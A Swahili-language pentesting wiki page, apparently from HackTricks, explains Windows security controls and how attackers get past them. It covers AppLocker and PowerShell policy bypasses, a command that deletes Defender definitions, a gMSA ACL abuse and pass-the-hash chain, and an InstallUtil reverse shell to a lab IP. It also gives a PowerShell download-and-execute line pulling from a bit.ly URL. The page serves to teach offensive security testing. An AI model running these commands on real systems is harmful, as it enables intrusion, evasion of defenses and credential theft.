# Vidhibiti vya Usalama vya Windows

{{#include ../../banners/hacktricks-training.md}}

## Sera ya AppLocker

Application whitelist ni orodha ya programu au executables zilizoidhinishwa kuruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na programu zisizoidhinishwa ambazo haziendani na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la Microsoft la application whitelisting** na huwapa wasimamizi wa mifumo uwezo wa kudhibiti **ni programu na faili zipi watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** wa executables, scripts, faili za Windows installer, DLLs, packaged apps na visakinishi vya packed apps.\
Ni kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na ufikiaji wa kuandika kwenye saraka fulani, **lakini yote haya yanaweza kuepukwa**.

### Kagua

Angalia ni faili/viongezi vipi vimeorodheshwa kwenye blacklist/whitelist:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

Njia hii ya registry ina mipangilio na sera zinazotumika na AppLocker, na hivyo kutoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Folda zinazoweza kuandikwa** zinazofaa kwa bypass ya sera ya AppLocker: Ikiwa AppLocker inaruhusu kutekeleza faili yoyote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **folda zinazoweza kuandikwa** unazoweza kutumia kufanya **bypass** hii.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Binaries [**"LOLBAS's"**](https://lolbas-project.github.io/) zinazoaminika kwa kawaida zinaweza pia kusaidia kukwepa AppLocker.
- **Sheria zilizoandikwa vibaya pia zinaweza kukwepwa**
  - Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**: unaweza kuunda **folda inayoitwa `allowed`** popote, nayo itaruhusiwa.
  - Mashirika pia mara nyingi hulenga **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo mengine** ya [**executables za PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kama vile `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **Utekelezaji wa DLL huwashwa mara chache sana** kutokana na mzigo wa ziada unaoweza kuweka kwenye mfumo, na majaribio mengi yanayohitajika kuhakikisha hakuna kitu kitakachoharibika. Kwa hiyo, kutumia **DLLs kama backdoors kutasaidia kukwepa AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** msimbo wa **PowerShell** katika process yoyote na kukwepa AppLocker. Kwa maelezo zaidi, angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za ndani zipo kwenye faili hili; passwords zimehifadhiwa kama hashes.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizohifadhiwa kama hashes) **huhifadhiwa** kwenye **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya ndani (sera ya password, ruhusa za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayokagua** credentials zilizotolewa ndani ya faili la **SAM** (kwa login ya ndani) na **kuwasiliana** na **domain controller** ili kuthibitisha domain user.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: tickets za Kerberos, hashes za NT na LM, na passwords zinazoweza kufumbuliwa kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye diski:

- Password ya akaunti ya kompyuta ya Active Directory (ikiwa domain controller haipatikani).
- Passwords za akaunti za Windows services
- Passwords za scheduled tasks
- Nyinginezo (password ya programu za IIS...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana kwenye Domain Controllers pekee.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana kwenye Windows 10 na Windows 11, na kwenye matoleo ya Windows Server. **Huzuia** zana za kawaida za pentesting kama vile **`WinPEAS`**. Hata hivyo, kuna njia za **kukwepa ulinzi huu**.

### Angalia

Ili kuangalia **hali** ya **Defender**, unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (angalia thamani ya **`RealTimeProtectionEnabled`** ili kujua ikiwa inatumika):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili kuichunguza, unaweza pia kuendesha:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS hulinda faili kwa kutumia usimbaji fiche, kwa kutumia **ufunguo linganifu** unaojulikana kama **File Encryption Key (FEK)**. Ufunguo huu husimbwa kwa **ufunguo wa umma** wa mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya faili iliyosimbwa. Usimbuaji fiche unapohitajika, **ufunguo wa faragha** unaolingana wa cheti cha kidijitali cha mtumiaji hutumika kutoa FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanapatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Hali za usimbuaji fiche bila mtumiaji kuanzisha** ni pamoja na:

- Faili au folda zinapohamishwa kwenda kwenye mfumo wa faili usiotumia EFS, kama vile [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), husimbuliwa kiotomatiki.
- Faili zilizosimbwa fiche zinapotumwa kupitia mtandao kwa kutumia itifaki ya SMB/CIFS, husimbuliwa kabla ya kutumwa.

Mbinu hii ya usimbaji fiche humwezesha mmiliki **kufikia faili zilizosimbwa fiche moja kwa moja**. Hata hivyo, kubadilisha tu nenosiri la mmiliki na kuingia hakutawezesha usimbuaji fiche.

**Mambo Muhimu ya Kukumbuka**:

- EFS hutumia FEK linganifu, inayosimbwa kwa ufunguo wa umma wa mtumiaji.
- Usimbuaji fiche hutumia ufunguo wa faragha wa mtumiaji kufikia FEK.
- Usimbuaji fiche wa kiotomatiki hufanyika chini ya hali mahususi, kama vile kunakili faili kwenda FAT32 au kuzituma kupitia mtandao.
- Mmiliki anaweza kufikia faili zilizosimbwa fiche bila hatua za ziada.

### Kukagua maelezo ya EFS

Angalia kama **mtumiaji** **ametumia** **huduma** hii kwa kukagua kama njia hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **ruhusa ya kufikia** faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folda ili **kusimba fiche** na **kusimbua** faili zote

### Kusimbua faili za EFS

#### Kuwa Authority System

Njia hii inahitaji **mtumiaji mwathiriwa** awe **anaendesha** **mchakato** ndani ya host. Ikiwa ndivyo, kwa kutumia `meterpreter` sessions unaweza kuiga token ya mchakato wa mtumiaji (`impersonate_token` kutoka `incognito`). Au unaweza tu kutumia `migrate` kuhamia kwenye mchakato wa mtumiaji.

#### Kujua nenosiri la mtumiaji

Mimikatz inaeleza jinsi ya kuingiza nyenzo za cheti/ufunguo wa faragha za mtumiaji na kusimbua faili zilizolindwa na EFS wakati nenosiri linajulikana.<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa akaunti za huduma katika miundombinu ya IT. Tofauti na akaunti za kawaida za huduma ambazo mara nyingi huwa na mipangilio ya "**Password never expire**", gMSA hutoa suluhisho salama na rahisi zaidi kusimamia:

- **Usimamizi wa Nenosiri Kiotomatiki**: gMSA hutumia nenosiri changamano lenye herufi 240, ambalo hubadilika kiotomatiki kulingana na sera ya domain au kompyuta. Mchakato huu husimamiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la kusasisha nenosiri kwa mkono.
- **Usalama Ulioimarishwa**: Akaunti hizi haziwezi kufungiwa nje na haziwezi kutumika kuingia kwa njia shirikishi, hivyo kuimarisha usalama wake.
- **Usaidizi wa Host Nyingi**: gMSA zinaweza kutumiwa na host nyingi, na kuzifanya zifae kwa huduma zinazoendeshwa kwenye seva nyingi.
- **Uwezo wa Kutumia Scheduled Task**: Tofauti na managed service accounts, gMSA zinaweza kutumika kuendesha scheduled tasks.
- **Usimamizi Rahisi wa SPN**: Mfumo husasisha kiotomatiki Service Principal Name (SPN) kunapokuwa na mabadiliko katika maelezo ya sAMaccount ya kompyuta au jina la DNS, hivyo kurahisisha usimamizi wa SPN.

Nenosiri za gMSA huhifadhiwa katika sifa ya LDAP _**msDS-ManagedPassword**_ na Domain Controllers (DCs) huzibadilisha kiotomatiki kila baada ya siku 30. Nenosiri hili ni data blob iliyosimbwa fiche inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e); linaweza tu kupatikana na wasimamizi walioidhinishwa na seva ambazo gMSA zimesakinishwa, hivyo kuhakikisha mazingira salama. Ili kufikia taarifa hii, unahitaji muunganisho salama kama LDAPS, au muunganisho lazima uthibitishwe kwa 'Sealing & Secure'.

![Kurelay NTLM authentication ili kupata nenosiri la gMSA](../../images/asd1.png)<sup>[[1]](#references)</sup>

Unaweza kusoma nenosiri hili kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>

```
/GMSAPasswordReader --AccountName jkohler
```

[**Pata maelezo zaidi katika utafiti asilia uliohifadhiwa kwenye kumbukumbu**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

Utafiti huohuo unaeleza jinsi **shambulio la NTLM relay** linavyoweza kupata **nenosiri la gMSA** ikiwa principal inayorelayiwa imeidhinishwa kusoma `msDS-ManagedPassword`.<sup>[[1]](#references)</sup>

### Kutumia vibaya uunganishaji wa ACL kusoma nenosiri linalodhibitiwa la gMSA (GenericAll -> ReadGMSAPassword)

Katika mazingira mengi, watumiaji wenye marupurupu ya chini wanaweza kupivot hadi kwenye siri za gMSA bila kuathiri DC kwa kutumia vibaya ACL za object zilizosanidiwa vibaya:<sup>[[3]](#references)</sup>

- Kikundi unachoweza kudhibiti (kwa mfano, kupitia GenericAll/GenericWrite) kinapewa `ReadGMSAPassword` juu ya gMSA.
- Kwa kujiongeza kwenye kikundi hicho, unapata haki ya kusoma blob ya `msDS-ManagedPassword` ya gMSA kupitia LDAP na kupata credentials halali za NTLM.

Mtiririko wa kawaida:

1) Gundua njia hiyo kwa kutumia BloodHound na uweke alama ya Owned kwa principals zako za foothold. Tafuta edges kama:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Jiongeze kwenye kikundi cha kati unachokidhibiti (mfano kwa kutumia bloodyAD):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) Soma nenosiri linalodhibitiwa la gMSA kupitia LDAP na ukokotoe NTLM hash. NetExec huendesha kiotomatiki uchimbaji wa `msDS-ManagedPassword` na ubadilishaji wake kuwa NTLM:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) Thibitisha utambulisho kama gMSA kwa kutumia NTLM hash (maandishi wazi hayahitajiki). Ikiwa akaunti iko kwenye Remote Management Users, WinRM itafanya kazi moja kwa moja:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

Maelezo:
- Usomaji wa LDAP wa `msDS-ManagedPassword` unahitaji sealing (kwa mfano, LDAPS/sign+seal). Zana hushughulikia hili kiotomatiki.
- Mara nyingi gMSA hupewa haki za ndani kama WinRM; thibitisha uanachama wa vikundi (kwa mfano, Remote Management Users) ili kupanga lateral movement.
- Ikiwa unahitaji blob pekee ili kuhesabu NTLM mwenyewe, angalia muundo wa MSDS-MANAGEDPASSWORD_BLOB.

Njia nyingine ya ACL ni ruhusa ya kuandika kwenye kitu cha gMSA chenyewe. `msDS-GroupMSAMembership` ni security descriptor inayotumika kubaini ni principals gani zinazoruhusiwa kupata nenosiri linalodhibitiwa. GUID ya schema yake ni `888eedd6-ce04-df40-b462-b8a50e41ba38`. ACE mahususi ya `WriteProperty` kwenye attribute hiyo kwa kikundi unachodhibiti inaweza kuwa njia ya kubadilisha orodha ya wasomaji; hali hii ni tofauti na kuwa tayari umeorodheshwa kama msomaji. Thibitisha DACL nzima, deny na inherited ACEs, pamoja na ruhusa zinazotumika kabla ya kuona njia hii kuwa inaweza kutumika. Uanachama mpya wa kikundi pia unahitaji token/session iliyosasishwa kabla ya kujaribu kusoma nenosiri.<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, inayoweza kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa nywila za Administrator wa ndani. Nywila hizi, ambazo **hubadilishwa bila mpangilio**, ni za kipekee na **hubadilishwa mara kwa mara**, huhifadhiwa katikati kwenye Active Directory. Ufikiaji wa nywila hizi huzuiwa kupitia ACLs na kuruhusiwa kwa watumiaji walioidhinishwa pekee. Ruhusa za kutosha zikipewa, mtumiaji anaweza kusoma nywila za admin wa ndani.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **huzuia vipengele vingi** vinavyohitajika ili kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu aina za .NET zilizoidhinishwa pekee, workflows zinazotumia XAML, PowerShell classes na mengine mengi.

### **Kagua**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

Katika matoleo ya sasa ya Windows, njia hiyo ya bypass haifanyi kazi tena, lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuikompaili huenda ukahitaji** **ku** _**Ongeza Marejeleo**_ -> _Vinjari_ ->_Vinjari_ -> ongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **ubadilishe mradi uwe .Net4.5**.

#### Bypass ya moja kwa moja:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) **kutekeleza** msimbo wa Powershell katika mchakato wowote na kupita mode yenye vizuizi. Kwa maelezo zaidi, angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi, imewekwa kuwa **restricted.** Njia kuu za kupita sera hii:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Zaidi yanaweza kupatikana [hapa](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Kiolesura cha Mtoa Huduma za Usaidizi wa Usalama (SSPI)

Ni API inayoweza kutumika kuthibitisha watumiaji.

SSPI huchagua itifaki inayofaa ya uthibitishaji kwa mashine mbili zinazowasiliana, na hupendelea Kerberos inapopatikana. Itifaki hizi hutekelezwa na Mifumo ya Usaidizi wa Usalama (SSP), ambayo husakinishwa kama DLL kwenye Windows; pande zote mbili lazima ziunge mkono mtoa huduma aliyechaguliwa kwa mazungumzo.

### SSP kuu

- **Kerberos**: Inayopendelewa
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za uoanifu
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Seva za wavuti na LDAP, nenosiri katika umbo la MD5 hash
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kujadiliana kuhusu itifaki ya kutumia (Kerberos au NTLM, huku Kerberos ikiwa chaguo-msingi)
  - %windir%\Windows\System32\lsasrv.dll

#### Majadiliano yanaweza kutoa mbinu kadhaa au moja tu.

## UAC - Udhibiti wa Akaunti ya Mtumiaji

[Udhibiti wa Akaunti ya Mtumiaji (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni kipengele kinachowezesha **kidokezo cha kuomba idhini kwa shughuli zinazohitaji ruhusa za juu**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Kurelay kwa gMSA – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA kupitia kuunganisha ruhusa hadi WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Kukwepa AppLocker na PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – Njia 15 za kukwepa Sera ya Utekelezaji ya PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ kusimbua faili za EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - sifa ya ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
